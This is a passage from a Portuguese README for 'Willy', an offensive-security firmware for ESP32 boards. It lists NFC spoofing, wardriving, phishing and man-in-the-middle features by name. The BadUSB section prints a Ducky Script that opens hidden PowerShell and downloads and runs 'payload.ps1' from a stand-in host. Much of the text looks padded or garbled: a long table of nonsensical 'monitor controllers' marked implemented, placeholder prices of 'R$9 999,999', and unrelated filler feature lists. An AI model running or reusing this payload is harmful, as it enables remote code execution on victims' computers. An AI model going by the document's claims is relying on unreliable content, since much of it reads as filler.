| **Doméstico** | **Barometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Hygrometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Anemometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Pyranometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Spectrometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Photometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Radiometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Magnetometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Gyroscope Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Accelerometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Inclinometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Tiltmeter Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Seismometer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Geophone Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Hydrophone Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Microphone Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Speaker Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Headphone Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Earphone Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Microphone Array Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Speaker Array Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Headphone Array Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Earphone Array Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Mixer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Amplifier Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Equalizer Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Compressor Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Limiter Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Gate Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Expander Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Reverb Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Delay Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Chorus Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Flanger Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Phaser Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Tremolo Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Vibrato Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Wah Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Fuzz Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Distortion Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Overdrive Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Boost Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Cut Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |
| **Doméstico** | **Audio Boost/Cut Monitor Controllers** | Controladores de Monitor | 433 MHz | ✅ Implementado |

### 💳 NFC/RFID (PN532)

| 📖 Operações de Leitura | ✍️ Operações de Escrita | 🎭 Emulação |
| :--- | :--- | :--- |
| - Mifare Classic | - Registros URL/NDEF | - Emulação de Cartão |
| - Mifare Ultralight | - Informações de Contato | - Spoofing de UID |
| - Série NTAG | - Credenciais WiFi | - Chameleon Ultra |
| - DESFire | - Dados Customizados | - Emulação Amiibo |
| - ISO 14443-A/B | - Cartões de Acesso | - UID Dinâmico |

[🔍 Ver Mais Recursos NFC/RFID](docs/nfc_pn532.md)

### ⌨️ BadUSB / HID

```d
// Exemplo de Ducky Script
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://exemplo.com/payload.ps1')
ENTER
```

[🔍 Ver Mais Recursos BadUSB](docs/badusb_hid_attacks.md)

### 🗺️ GPS e Wardriving

| Recurso | Descrição |
| :--- | :--- |
| **Wardriving** | Log WiFi + dados GPS |
| **Export Wigle.net** | Upload para Wigle |
| **Rastreamento em Tempo Real** | Posição, Velocidade, Direção |
| **Export KML** | Visualização no Google Earth |
| **Custom Tools** | [Ferramentas Ofensivas](docs/hardware_custom_tools.md) |

[🔍 Ver Mais Recursos GPS](docs/gps_neo6m.md)

---

## 🚀 Willy 2.1 Refinements

A nova versão **Willy 2.1** traz uma experiência de usuário premium, recursos forenses avançados e desenvolvimento de ferramentas de geolocalização para pentest para o repositório oficial.

### 🌍 GPS Mapping & Geolocalização Avançada

- **Tracker e Mapping**: GPS tracker integrado com gravação de rotas e coordenadas em tempo real.
- **Wardriving Integrado**: Escaneamento simultâneo de WiFi e rastreamento geográfico para auditoria sem fio.
- **Wigle Upload**: Sincronização direta de dados de wardriving com a plataforma Wigle.net para análise avançada de segurança em redes.
- **Modos de Navegação Avançados**: Portátil, Estacionário, Pedestre, Automotivo, Marítimo e Aéreo com precisão otimizada para cada cenário.
- **Configurações de Energia**: Modo Max Desempenho, Eco e Power Save para otimizar consumo de bateria em diferentes cenários de uso.
- **Taxas de Atualização Configuráveis**: De 1Hz a 10Hz para aplicações que exigem diferentes níveis de precisão e atualização.
- **Filtro de Satélites**: Configurações de 25dB-Hz a 40dB-Hz para filtrar sinais fracos e melhorar a precisão em ambientes com interferência.
- **Protocolos de Comunicação**: Suporte a NMEA, UBX e NMEA+UBX para máxima compatibilidade e eficiência.
- **Exportação Múltipla**: Formatos CSV (WiGLE), GPX (Google Earth), KML e JSON para diferentes aplicações de análise.
- **Mapas Interativos**: Visualização de rotas e pontos de interesse diretamente na interface web com sobreposição de dados WiFi.
- **Geofencing**: Criação de áreas geográficas virtuais para monitoramento e alertas automáticos quando o dispositivo entra/sai de zonas definidas.
- **Rastreamento em Tempo Real**: Monitoramento ao vivo da posição, velocidade, direção e altitude com atualizações configuráveis.
- **Análise de Padrões**: Detecção automatica de padrões de movimento, pontos de parada frequentes e rotas recorrentes.
- **Integração com APIs**: Conexão com serviços de mapas como Google Maps, OpenStreetMap e Mapbox para visualização avançada.

### 🎨 Cyber Menu 2.1

- **Interface Futurista**: Ícones com arte vetorial moderna e animações 3D de zoom.
- **Efeitos Neon**: Pulsação de bordas e partículas de brilho (particle glow) ao interagir.
- **Barra de Notificações**: Status em tempo real de bateria, relógio e conectividade no topo da tela.
- **Animações Avançadas**: Cascade entry com efeito de onda, zoom suave de 1.3x, rotação 3D de 8 graus e sombras coloridas.
- **Temas Dinâmicos**: Sistema de cores personalizável com primária e secundária integrado ao tema do sistema.
- **Integração Modular**: Chamadas diretas para callbacks dos módulos existentes (Wi-Fi, BLE, IR, etc.).
- **Notificações Interativas**: Símbolos visuais para WiFi e Bluetooth com indicação de força do sinal.
- **Sincronização NTP**: Relógio em tempo real com suporte a NTP para precisão absoluta.
- **Indicadores de Bateria**: Sistema de cores codificado (Verde > 50%, Amarelo > 20%, Vermelho < 20%).
- **Otimização de Performance**: Menos de 10KB de footprint adicional com LVGL 8.3.11 para máxima performance no ESP32.
- **Efeitos de Transição**: Animações suaves entre telas com easing functions personalizáveis.
- **Feedback Tátil**: Vibração e feedback sonoro para ações importantes (configurável).
- **Modo Escuro/Auto**: Detecção automática de tema com opção de forçar modo escuro ou claro.
- **Layout Responsivo**: Adaptação automática para diferentes tamanhos de tela com grid system inteligente.
- **Cache de Recursos**: Sistema de cache para ícones e animações para melhor performance em dispositivos lentos.

### 🕵️ Forensic Logging System

- **Logs Estruturados**: Gravação automática de eventos em `/WILLY_LOGS/` no formato CSV.
- **Rastreamento Operacional**: Registro detalhado de ataques WiFi, BLE e inicialização de módulos.
- **Análise Forense**: Ideal para auditorias e estudos pós-operação.
- **Logs Temporais**: Timestamps precisos com milissegundos para cada evento registrado.
- **Categorização Automática**: Separação por tipo de evento (WiFi, BLE, RF, IR, GPS, NFC, BadUSB).
- **Nível de Detalhe Configurável**: Opções de log básico, detalhado e completo para diferentes necessidades forenses.
- **Compactação Automática**: Arquivos de log são compactados automaticamente quando atingem tamanho limite.
- **Indexação Rápida**: Sistema de indexação para busca rápida de eventos por data, hora ou tipo.
- **Exportação Múltipla**: Formatos CSV, JSON, XML e TXT para integração com ferramentas forenses.
- **Correlação de Eventos**: Sistema que relaciona eventos relacionados entre diferentes módulos.
- **Cadeia de Custódia**: Registro de quem acessou e modificou os logs para integridade forense.
- **Alertas em Tempo Real**: Notificações para eventos suspeitos ou padrões anômalos detectados.
- **Análise Estatística**: Geração de relatórios automáticos com estatísticas de uso e padrões de ataque.
- **Proteção contra Alteração**: Sistema de assinatura digital para garantir que logs não foram modificados.
- **Armazenamento Seguro**: Logs podem ser armazenados em cartão SD criptografado ou enviados para servidor remoto.
- **Interface Web de Análise**: Visualização e análise dos logs diretamente pela interface web com filtros avançados.

### 🌐 Futuristic Web Dashboard

- **Painel Responsivo**: Controle total do dispositivo via navegador com estética glassmorphism.
- **Live Stats**: Gráficos e indicadores em tempo real (RSSI, Heap, Uptime).
- **Log Viewer**: Terminal web integrado para visualização remota dos logs forenses.
- **Design Glassmorphism**: Interface moderna com efeitos de vidro fosco e transparência controlada.
- **Gráficos em Tempo Real**: Chart.js integrado para visualização de dados WiFi, BLE, GPS e sistema em tempo real.
- **Navegação Remota**: Controle total da tela TFT via navegador com botões de navegação e atalhos de teclado.
- **Gerenciador de Arquivos Completo**: Upload, download, edição e execução de arquivos diretamente da web interface.
- **Terminal Web Integrado**: Envio de comandos serial com histórico, auto-completar e saída formatada.
- **Sistema de Autenticação Seguro**: Login com criptografia, sessões expiráveis e proteção contra brute force.
- **PWA (Progressive Web App)**: Instalável como aplicativo nativo em mobile e desktop com suporte a offline mode.
- **Múltiplos Temas**: Sistema de temas personalizáveis com cores primárias e secundárias ajustáveis.
- **Notificações em Tempo Real**: Sistema de push notifications para eventos importantes do sistema.
- **API REST Completa**: Endpoints para controle total do dispositivo via HTTP/HTTPS.
- **Monitoramento de Recursos**: Gráficos de uso de CPU, memória, WiFi, bateria e temperatura em tempo real.
- **Backup e Restore**: Sistema de backup completo das configurações e logs com restore automático.
- **Controle Remoto de Módulos**: Ativação e controle remoto de todos os módulos (WiFi, BLE, IR, GPS, etc.).
- **Visualização de Capturas**: Visualização direta de PCAP, IR Codes, Sub-GHz signals, NFC dumps e GPS logs.
- **Análise de Rede**: Ferramentas avançadas de análise de rede com detecção de padrões e anomalias.
- **Controle de Brilho e Rotação**: Ajuste remoto do brilho da tela e rotação sem necessidade de reinicialização.
- **Sistema de Atalhos**: Atalhos de teclado globais para ações rápidas e navegação eficiente.

---

## 🚀 Recursos Adicionais Avançados

### 🎯 Pentest & Hacking Profissional

#### 🔄 Engenharia Social & Phishing

- **Template Manager**: Sistema de gerenciamento de templates para phishing e engenharia social
- **Email Spoofing**: Criação de emails falsos com domínios personalizados
- **SMS Phishing**: Envio de mensagens SMS com links maliciosos
- **QR Code Phishing**: Geração de QR codes para redirecionamento malicioso
- **Social Engineering Toolkit**: Coleção de ferramentas para testes de engenharia social

#### 🔍 OSINT & Intelligence Gathering

- **Reconhecimento Automatizado**: Coleta de informações alvos via APIs públicas
- **Análise de Redes Sociais**: Extração de dados perfis e relacionamentos
- **Monitoramento de Domínios**: Rastreamento de mudanças e subdomínios
- **Geolocalização de IPs**: Mapeamento de localização de servidores e redes
- **Análise de Metadados**: Extração de informações ocultas em imagens e documentos

#### 💻 Pentest Web Avançado

- **Web Vulnerability Scanner**: Detecção automática de vulnerabilidades web
- **SQL Injection Tester**: Testes automatizados de injeção SQL
- **XSS Scanner**: Análise de cross-site scripting em aplicações web
- **CSRF Tester**: Verificação de cross-site request forgery
- **Directory & File Discovery**: Enumeração de diretórios e arquivos ocultos

#### 🛡️ Análise de Malware & Forense Digital

- **Análise Estática**: Exame de malware sem execução
- **Análise Dinâmica**: Execução controlada em ambiente sandbox
- **Desmontagem de Binários**: Análise de código assembly e descompilação
- **Assinatura Digital**: Verificação de hashes e assinaturas de arquivos
- **Carving de Dados**: Recuperação de dados apagados de mídias

### 🌐 Redes & Comunicações

#### 📡 Análise de Protocolos

- **Protocol Analyzer**: Captura e análise de tráfego de rede
- **SSL/TLS Analysis**: Verificação de configurações e vulnerabilidades SSL
- **DNS Analysis**: Análise de queries e respostas DNS
- **HTTP/HTTPS Analysis**: Inspeção detalhada de tráfego web
- **Custom Protocol Support**: Suporte a protocolos proprietários e customizados

#### 🔄 Man-in-the-Middle (MITM)

- **ARP Spoofing**: Ataques de envenenamento de tabela ARP
- **DNS Spoofing**: Redirecionamento de consultas DNS
- **SSL Stripping**: Ataques de downgrade SSL/TLS
- **Session Hijacking**: Captura e reutilização de sessões
- **Traffic Interception**: Interceptação e modificação de tráfego

### 🎮 Gaming & Entretenimento

#### 🎮 Controle Remoto Universal

- **IR Database**: Banco de dados com milhares de códigos IR para TVs, áudio, etc.
- **Learning Mode**: Aprendizado de novos códigos IR via interface web
- **Macro Programming**: Criação de macros complexas com sequências de comandos
- **Voice Control**: Integração com assistentes de voz (Alexa, Google Assistant)
- **Mobile App**: Controle remoto via aplicação mobile dedicada

#### 🎵 Streaming & Mídia

- **AirPlay/DLNA**: Transmissão de mídia para dispositivos compatíveis
- **Radio Streaming**: Acesso a estações de rádio online
- **Media Server**: Servidor de mídia para streaming local
- **Recording**: Gravação de áudio e vídeo de streams
- **Playlist Management**: Criação e gerenciamento de playlists

### 🏢 Business & Productivity

#### 📊 Business Intelligence

- **Data Collection**: Coleta automatizada de dados de negócios
- **Report Generation**: Geração de relatórios automatizados
- **Analytics Dashboard**: Painel com métricas e KPIs
- **Data Visualization**: Gráficos e visualizações interativas
- **API Integration**: Conexão com sistemas de negócios existentes

#### 🔄 Process Automation

- **Workflow Engine**: Motor de automação de processos
- **Task Scheduler**: Agendamento de tarefas automáticas
- **File Processing**: Processamento automático de arquivos
- **Email Automation**: Automação de tarefas relacionadas a email
- **Data Sync**: Sincronização de dados entre sistemas

### 🎨 Criatividade & Design

#### 🎨 Design Tools

- **Color Palette Generator**: Geração de paletas de cores harmoniosas
- **Font Pairing**: Sugestões de combinações de fontes
- **Pattern Generator**: Criação de padrões e texturas
- **Icon Library**: Biblioteca de ícones vetoriais
- **Template System**: Sistema de templates para designs

#### 🎵 Music & Audio

- **Audio Processing**: Ferramentas de processamento de áudio
- **Music Theory**: Acompanhamento teórico musical
- **Sound Generator**: Geração de sons e efeitos sonoros
- **MIDI Controller**: Controle de dispositivos MIDI
- **Audio Visualization**: Visualização de áudio em tempo real

### 🚀 Desenvolvimento & Programação

#### 💻 IDE Web

- **Code Editor**: Editor de código com syntax highlighting
- **Debugger**: Depurador remoto para código embarcado
- **Version Control**: Integração com Git e GitHub
- **Package Manager**: Gerenciamento de dependências
- **Build System**: Sistema de compilação e deploy

#### 🧪 Testing & QA

- **Unit Testing**: Framework de testes unitários
- **Integration Testing**: Testes de integração de módulos
- **Performance Testing**: Testes de desempenho e carga
- **Automated Testing**: Automação de testes funcionais
- **Code Coverage**: Análise de cobertura de código

---

## 🖥️ Hardware Suportado

### 🏆 Dispositivos Recomendados

<div align="center">

| Dispositivo | Display | Touch | SD Card | USB | Preço | Status |
 |-------------|---------|-------|---------|-----|----------------|--------|
 | **CYD-2432S028** | 2.8" TFT | Resistivo | ✅ | 1x USB-C | **R$9 999,999** | ⭐ Recomendado |
 | **CYD-2USB** | 2.8" TFT | Resistivo | ✅ | 2x USB-C | **R$9 999,999** | ⭐ Recomendado |
  | **M5Stack Core2 Pro** | 2.0" TFT | Capacitivo | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **Lilygo T‑Display Pro** | 2.0" TFT | Capacitivo | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **ESP32‑S3‑DevKitM** | 2.4" TFT | Capacitivo | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **Raspberry Pi Pico W Plus** | 2.0" LCD | Capacitivo | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **Arduino Nano ESP32 Pro** | 1.3" TFT | Capacitivo | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **ESP32‑S2‑DevKitC** | 2.4" TFT | ❌ | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **ESP32‑S3‑DevKitC** | 2.4" TFT | ❌ | ✅ | USB‑C | **R$ 9 999,999** | ✅ Suportado |
  | **Flipper Zero** | 1.8" LCD | ❌ | ✅ | Micro‑USB | **R$ 9 999,999** | ✅ Suportado |
  | **Raspberry Pi Pico W** | 2.0" LCD | ❌ | ✅ | Micro‑USB | **R$ 9 999,999** | ✅ Suportado |
  | **Arduino Nano ESP32** | 0.96" OLED | ❌ | ✅ | Micro‑USB | **R$ 9 999,999** | ✅ Suportado |

</div>

<div align="center">
[<kbd>🔍 Ver Mais Hardware</kbd>](docs/hardware_externo.md)
</div>

### 🔌 Módulos Externos

<div align="center">

| Módulo | Função | Interface | Preço |
|--------|--------|-----------|-------|
| **CC1101** | Transceptor Sub-GHz | SPI | ~R$15 |
| **NRF24L01+** | Transceptor 2.4GHz (Opcional) | SPI | ~R |
| **2x NRF24L01+ PA+LNA** | 2.4GHz Longo Alcance (Dual Setup) | SPI | ~R |
| **PN532** | Leitor NFC/RFID | I2C/SPI | ~R$40 |
| **NEO-6M GPS** | Módulo GPS | UART | ~R$50 |
| **LED IR** | Transmissor Infravermelho | GPIO | ~R$0,50 |
| **Receptor TSOP IR** | Receptor Infravermelho | GPIO | ~R$2,50 |
| **W5500** | Ethernet | SPI | ~R$25 |

</div>

<div align="center">
 [<kbd>🔍 Ver Mais Módulos</kbd>](docs/hardware_externo.md)
</div>

<div align="center">
 [<kbd>🔍 Ver Mais Dispositivos</kbd>](docs/device_details.md)
</div>

---

## 🚀 Início Rápido

### Pré-requisitos

```bash
# Instalar PlatformIO
pip install platformio

# Ou usar a extensão VS Code
# Procure por "PlatformIO IDE" nas extensões
```

### 📥 Instalação

#### Opção 1: Binário Pré-compilado (Recomendado para iniciantes)

1. Baixe o firmware mais recente em [Releases](https://github.com/lelebrr/Willy/releases)
2. Conecte seu dispositivo via USB
3. Use o web flasher em [Willy.computer](https://Willy.computer)
   - OU use esptool:

   ```bash
   esptool.py --port COM3 write_flash 0x0 Willy-CYD-2USB.bin
   ```

#### Opção 2: Compilar do Código Fonte

```bash
# Clonar o repositório
git clone https://github.com/lelebrr/Willy
cd Willy

# Compilar para seu dispositivo (exemplo CYD-2USB)
pio run -e CYD-2USB

# Upload para o dispositivo
pio run -e CYD-2USB --target upload

# Ou usar a variável de ambiente
pio run --target upload
```

---

## 📚 Documentação

### 📖 Documentação Completa

| Tópico | Descrição |
|--------|-----------|
| [Configuração de Hardware](docs/hardware_externo.md) | Conectando módulos externos |
| [Guia CYD](docs/hardware_cyd_2432s028r.md) | Guia específico CYD-2432S028 |
| [Ataques WiFi](docs/wifi_advanced_attacks.md) | Técnicas avançadas de WiFi |
| [Ataques BLE](docs/ble_advanced_attacks.md) | Teste de segurança Bluetooth |
| [Ataques IR](docs/ir_advanced_attacks.md) | Manipulação de infravermelho |
| [Ataques RF](docs/rf_advanced_attacks.md) | Operações Sub-GHz |
| [Guia NFC](docs/nfc_pn532.md) | Operações NFC/RFID |
| [BadUSB](docs/badusb_hid_attacks.md) | Payloads de ataque HID |
| [Configuração GPS](docs/gps_neo6m.md) | Setup de wardriving GPS |
| [Wiring CC1101](docs/cc1101_nrf24_wiring.md) | Conexões de módulos RF |

---

## 📜 Licença

**Willy Firmware** é protegido por uma licença proprietária restrita. O uso, modificação, distribuição ou reprodução deste software é estritamente proibida sem autorização por escrito dos detentores dos direitos autorais.

### Termos de Uso

1. **Licenciamento**: Este software é fornecido "como está", sem garantias de qualquer tipo, expressas ou implícitas.
2. **Uso Restrito**: O uso deste software é limitado a ambientes controlados e autorizados.
3. **Responsabilidade**: Os desenvolvedores não se responsabilizam por quaisquer danos resultantes do uso deste software.
4. **Modificação**: Qualquer modificação no código fonte requer aprovação prévia por escrito.
5. **Distribuição**: A distribuição deste software é estritamente proibida sem autorização explícita.

### Limitações de Responsabilidade

EM NENHUMA CIRCUNSTÂNCIA, OS DESENVOLVEDORES OU DETENTORES DE DIREITOS AUTORAIS SERÃO RESPONSÁVEIS POR QUAISQUER DANOS DIRETOS, INDIRETOS, INCIDENTAIS, ESPECIAIS, EXEMPLARES OU CONSEQUENTES (INCLUINDO, MAS NÃO SE LIMITANDO A, AQUISIÇÃO DE BENS OU SERVIÇOS SUBSTITUTOS, PERDA DE USO, DADOS OU LUCROS, OU INTERRUPÇÃO DE ATIVIDADES COMERCIAIS), CAUSADOS POR OU RELACIONADOS AO SOFTWARE OU AO USO OU OUTRAS NEGOCIAÇÕES NO SOFTWARE.

### Direitos Autorais

© 2024 Willy Firmware. Todos os direitos reservados.

### Contato

Para informações sobre licenciamento comercial ou autorizações especiais, entre em contato através dos canais oficiais do projeto.

**[⬆ Voltar ao Topo](#-Willy-firmware)**

---

## 🛡️ Desenvolvedor

**Willy Firmware** é desenvolvido e mantido por uma equipe especializada em segurança cibernética e desenvolvimento embarcado.

**[⬆ Voltar ao Topo](#-Willy-firmware)**

<img src="media/pictures/Willy_hd.png" alt="Logo Willy" width="150"/>

*Segurança em suas mãos*

</div>
